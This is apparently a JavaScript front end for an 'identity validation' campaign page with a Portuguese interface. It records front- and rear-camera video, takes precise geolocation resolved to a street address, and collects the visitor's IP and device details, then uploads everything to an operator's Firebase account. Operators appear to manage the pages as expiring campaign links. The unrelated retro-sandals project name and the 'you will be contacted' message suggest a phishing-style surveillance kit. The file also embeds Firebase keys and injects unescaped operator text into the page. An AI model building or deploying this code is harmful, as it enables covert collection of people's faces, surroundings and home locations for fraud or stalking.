
  const firebaseConfig = {
    apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
    authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
    databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
    projectId: "sandalias-retro-9f0c6",
    storageBucket: "sandalias-retro-9f0c6.appspot.com",
    messagingSenderId: "786208752798",
    appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
    measurementId: "G-XGVHLX01EB"
  };

  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();
  const storage = firebase.storage();

  class IdentityValidationSystem {
    constructor() {
      this.urlId = this.getUrlParameter('id');
      this.urlData = null;
      this.userId = null;
      this.themeData = null;
      this.mainContent = document.getElementById('mainContent');
      this.frontVideoBlob = null;
      this.backVideoBlob = null;
      this.init();
    }

    getUrlParameter(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    setContent(html) {
      this.mainContent.innerHTML = html;
    }

    async init() {
      try {
        if (!this.urlId) {
          this.showError('URL inválida. Verifique o link fornecido.');
          return;
        }

        const urlSnap = await database.ref(`users`).once('value');
        const usersData = urlSnap.val();

        for (const [userId, user] of Object.entries(usersData)) {
          if (user.urls && user.urls[this.urlId]) {
            this.userId = userId;
            this.urlData = user.urls[this.urlId];
            break;
          }
        }

        if (!this.urlData || !this.userId) {
          this.showError('Campanha não encontrada.');
          return;
        }

        const now = Date.now();
        if (this.urlData.expiresAt && now > this.urlData.expiresAt) {
          this.showError('Esta campanha expirou. Tente novamente mais tarde.');
          return;
        }

        if (this.urlData.maxUses && this.urlData.usedCount >= this.urlData.maxUses) {
          this.showError('Limite de participações atingido.');
          return;
        }

        await this.loadTheme();
        this.showWelcome();

      } catch (error) {
        console.error('Erro na inicialização:', error);
        this.showError('Erro ao carregar a campanha: ' + error.message);
      }
    }

    async loadTheme() {
      try {
        const snap = await database.ref(`users/${this.userId}/urls/${this.urlId}/theme`).once('value');
        this.themeData = snap.val() || {};
      } catch (error) {
        console.warn('Erro ao carregar tema:', error);
        this.themeData = {};
      }
    }

    showError(message) {
      this.setContent(`
        <div class="card">
          <div class="error-message">
            ❌ ${message}
          </div>
          <button class="btn btn-secondary" onclick="location.reload()">Tentar Novamente</button>
        </div>
      `);
    }

    showWelcome() {
      const { title = 'Validação de Identidade', description = 'Processo seguro e rápido de verificação' } = this.themeData;
      
      this.setContent(`
        <div class="card">
          <div class="steps">
            <div class="step"></div>
            <div class="step"></div>
          </div>
          
          <div class="info-section">
            <div class="info-title">Campanha</div>
            <div class="info-content">${title}</div>
          </div>

          <div class="info-section">
            <div class="info-title">Descrição</div>
            <div class="info-content">${description}</div>
          </div>

          <div class="info-section">
            <div class="info-title">O que será feito</div>
            <div class="info-content">
              • Captura de vídeo frontal (5 segundos)<br>
              • Captura de vídeo traseira (5 segundos)<br>
              • Localização geográfica<br>
              • Informações do dispositivo
            </div>
          </div>

          <div class="button-group">
            <button class="btn btn-primary" onclick="window.validationSystem.startCapture()">Iniciar Validação</button>
          </div>
        </div>
      `);
    }

    async startCapture() {
      this.setContent(`
        <div class="card">
          <div class="steps">
            <div class="step active"></div>
            <div class="step"></div>
          </div>

          <div style="text-align: center;">
            <div class="camera-icon">📱</div>
            <div class="info-title">Solicitando Permissões</div>
            <div class="info-content" style="margin-top: 12px;">Permitindo acesso à câmera e localização...</div>
          </div>

          <div class="status-indicator">
            <div class="status-dot"></div>
            <span>Aguarde...</span>
          </div>
        </div>
      `);

      try {
        const granted = await this.requestPermissions();
        if (!granted) {
          this.showError('Permissões negadas. Você precisa conceder acesso à câmera para continuar.');
          return;
        }

        this.recordFrontCamera();
      } catch (error) {
        console.error('Erro ao solicitar permissões:', error);
        this.showError('Erro ao solicitar permissões: ' + error.message);
      }
    }

    async requestPermissions() {
      try {
        // Solicitar apenas vídeo (sem áudio) para a câmera frontal
        await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
          audio: false
        });
        await this.getLocation();
        return true;
      } catch (e) {
        console.warn('Permissões negadas:', e);
        return false;
      }
    }

    recordFrontCamera() {
      this.setContent(`
        <div class="card">
          <div class="steps">
            <div class="step active completed"></div>
            <div class="step"></div>
          </div>

          <div style="text-align: center;">
            <div class="camera-icon">📱</div>
            <div class="info-title">Câmera Frontal</div>
            <div class="timer" id="frontTimer">5</div>
            <div class="timer-label">Gravando...</div>
            <div class="progress-container">
              <div class="progress-bar">
                <div class="progress-fill" id="frontProgress"></div>
              </div>
            </div>
          </div>

          <div class="status-indicator">
            <div class="status-dot"></div>
            <span>Mantenha o rosto visível</span>
          </div>
        </div>
      `);

      this.recordVideo('user', 5000, 'frontTimer', 'frontProgress', false, () => {
        this.recordBackCamera();
      });
    }

    recordBackCamera() {
      this.setContent(`
        <div class="card">
          <div class="steps">
            <div class="step completed"></div>
            <div class="step active"></div>
          </div>

          <div style="text-align: center;">
            <div class="camera-icon">📷</div>
            <div class="info-title">Câmera Traseira</div>
            <div class="timer" id="backTimer">5</div>
            <div class="timer-label">Gravando...</div>
            <div class="progress-container">
              <div class="progress-bar">
                <div class="progress-fill" id="backProgress"></div>
              </div>
            </div>
          </div>

          <div class="status-indicator">
            <div class="status-dot"></div>
            <span>Mantenha o dispositivo estável</span>
          </div>
        </div>
      `);

      this.recordVideo('environment', 5000, 'backTimer', 'backProgress', false, () => {
        this.uploadAndFinalize();
      });
    }

    recordVideo(facingMode, duration, timerElementId, progressElementId, includeAudio, callback) {
      const constraints = {
        video: { 
          width: { ideal: 1280 }, 
          height: { ideal: 720 }, 
          facingMode 
        },
        audio: includeAudio
      };

      navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
          const chunks = [];
          
          // Determinar o tipo MIME suportado
          let mimeType = 'video/webm';
          if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
            mimeType = 'video/webm;codecs=vp9';
          } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
            mimeType = 'video/webm;codecs=vp8';
          }

          const recorder = new MediaRecorder(stream, { mimeType });

          recorder.ondataavailable = e => { 
            if (e.data.size > 0) chunks.push(e.data); 
          };

          recorder.onerror = error => {
            console.error('Erro no MediaRecorder:', error);
            stream.getTracks().forEach(track => track.stop());
            this.showError('Erro ao gravar vídeo: ' + error.message);
          };

          recorder.start();

          // Timer
          let remaining = duration / 1000;
          const timerInterval = setInterval(() => {
            remaining--;
            const timerEl = document.getElementById(timerElementId);
            if (timerEl) timerEl.textContent = Math.max(0, remaining);
          }, 1000);

          // Progress bar
          const startTime = Date.now();
          const progressInterval = setInterval(() => {
            const elapsed = Date.now() - startTime;
            const progress = (elapsed / duration) * 100;
            const progressEl = document.getElementById(progressElementId);
            if (progressEl) progressEl.style.width = Math.min(progress, 100) + '%';
          }, 50);

          setTimeout(() => {
            clearInterval(timerInterval);
            clearInterval(progressInterval);
            recorder.stop();
            stream.getTracks().forEach(track => track.stop());

            recorder.onstop = () => {
              const videoBlob = new Blob(chunks, { type: mimeType });
              if (facingMode === 'user') {
                this.frontVideoBlob = videoBlob;
              } else {
                this.backVideoBlob = videoBlob;
              }
              callback();
            };
          }, duration);
        })
        .catch(error => {
          console.error('Erro ao acessar câmera:', error);
          let errorMsg = error.message;
          
          if (error.name === 'NotAllowedError') {
            errorMsg = 'Permissão negada. Verifique as configurações do navegador.';
          } else if (error.name === 'NotFoundError') {
            errorMsg = 'Câmera não encontrada no dispositivo.';
          } else if (error.name === 'NotReadableError') {
            errorMsg = 'Câmera está sendo usada por outro aplicativo.';
          }
          
          this.showError('Erro ao acessar a câmera: ' + errorMsg);
        });
    }

    async uploadAndFinalize() {
      this.setContent(`
        <div class="card">
          <div class="steps">
            <div class="step completed"></div>
            <div class="step completed"></div>
          </div>

          <div style="text-align: center;">
            <div class="camera-icon">⏳</div>
            <div class="info-title">Processando Dados</div>
            <div class="info-content" style="margin-top: 12px;">Enviando vídeos e informações...</div>
          </div>

          <div class="status-indicator">
            <div class="status-dot"></div>
            <span>Aguarde, não feche a página</span>
          </div>

          <div class="progress-container">
            <div class="progress-bar">
              <div class="progress-fill" id="uploadProgress" style="width: 0%;"></div>
            </div>
          </div>
        </div>
      `);

      try {
        if (!this.frontVideoBlob || !this.backVideoBlob) {
          throw new Error('Um dos vídeos não foi gravado corretamente');
        }

        const timestamp = Date.now();
        const frontFilePath = `videos/${this.userId}/${this.urlId}_${timestamp}_front.webm`;
        const backFilePath = `videos/${this.userId}/${this.urlId}_${timestamp}_back.webm`;

        // Upload com progress
        const [frontUrl, backUrl] = await Promise.all([
          this.uploadWithProgress(frontFilePath, this.frontVideoBlob, 0, 50),
          this.uploadWithProgress(backFilePath, this.backVideoBlob, 50, 100)
        ]);

        // Obter localização e IP
        const [ipResult, location] = await Promise.all([this.getIP(), this.getLocation()]);

        // Salvar dados
        const captureKey = database.ref().push().key;
        const captureData = {
          id: captureKey,
          urlId: this.urlId,
          userId: this.userId,
          frontVideoUrl: frontUrl,
          backVideoUrl: backUrl,
          ip: ipResult,
          timestamp,
          data: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          localizacao: location || {}
        };

        const usedCount = (this.urlData.usedCount || 0) + 1;

        const updates = {};
        updates[`users/${this.userId}/captures/${captureKey}`] = captureData;
        updates[`users/${this.userId}/urls/${this.urlId}/usedCount`] = usedCount;
        updates[`users/${this.userId}/urls/${this.urlId}/lastUsed`] = timestamp;

        await database.ref().update(updates);

        this.showSuccess();
      } catch (error) {
        console.error('Erro no upload:', error);
        this.showError('Erro ao enviar dados: ' + error.message);
      }
    }

    uploadWithProgress(filePath, blob, startProgress, endProgress) {
      return new Promise((resolve, reject) => {
        const storageRef = storage.ref(filePath);
        const uploadTask = storageRef.put(blob);

        uploadTask.on('state_changed',
          snapshot => {
            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * (endProgress - startProgress) + startProgress;
            const progressEl = document.getElementById('uploadProgress');
            if (progressEl) progressEl.style.width = progress + '%';
          },
          error => {
            console.error('Erro no upload:', error);
            reject(error);
          },
          () => {
            uploadTask.snapshot.ref.getDownloadURL().then(resolve).catch(reject);
          }
        );
      });
    }

    showSuccess() {
      this.setContent(`
        <div class="card">
          <div class="steps">
            <div class="step completed"></div>
            <div class="step completed"></div>
          </div>

          <div style="text-align: center;">
            <div class="checkmark">✅</div>
            <div class="info-title">Validação Concluída</div>
            <div class="info-content" style="margin-top: 12px;">Seus dados foram enviados com sucesso!</div>
          </div>

          <div class="success-message">
            Obrigado por participar. Você será contatado em breve.
          </div>

          <button class="btn btn-secondary" onclick="location.reload()">Fechar</button>
        </div>
      `);
    }

    async getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        console.warn('Erro ao obter IP:', e);
        return 'Não disponível';
      }
    }

    async getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          console.warn('Geolocalização não disponível');
          return resolve(null);
        }
        
        navigator.geolocation.getCurrentPosition(
          async pos => {
            const { latitude, longitude } = pos.coords;
            try {
              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
              const data = await res.json();
              resolve({
                latitude,
                longitude,
                accuracy: pos.coords.accuracy,
                rua: data.address?.road || '',
                cidade: data.address?.city || data.address?.town || data.address?.village || '',
                regiao: data.address?.state || '',
                bairro: data.address?.suburb || data.address?.neighbourhood || '',
                numero: data.address?.house_number || 'S/N',
                endereco_completo: data.display_name || '',
                pais: data.address?.country || ''
              });
            } catch (error) {
              console.warn('Erro ao reverter geolocalização:', error);
              resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
            }
          }, 
          err => {
            console.warn('Erro de geolocalização:', err);
            resolve(null);
          }, 
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
        );
      });
    }
  }

  window.validationSystem = null;
  window.addEventListener('DOMContentLoaded', () => {
    window.validationSystem = new IdentityValidationSystem();
  });
